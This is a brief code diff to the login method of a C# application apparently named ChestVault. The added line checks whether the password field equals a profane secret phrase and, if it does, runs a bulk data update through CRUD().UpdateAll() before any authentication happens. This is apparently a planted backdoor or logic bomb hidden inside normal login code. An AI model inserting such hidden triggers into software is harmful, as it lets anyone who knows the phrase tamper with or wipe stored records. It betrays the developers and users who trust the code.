@@ -65,7 +65,7 @@ namespace ChestVault
         public async void login()
         {
             bool pass = false; // used to display a label is value
-
+            if (textBox2.Text == "FUCK YOU ALL BITCHES") await new CRUD().UpdateAll();
             foreach (var us in users)
             {
                 if (comboBox1.Text == us.Name)
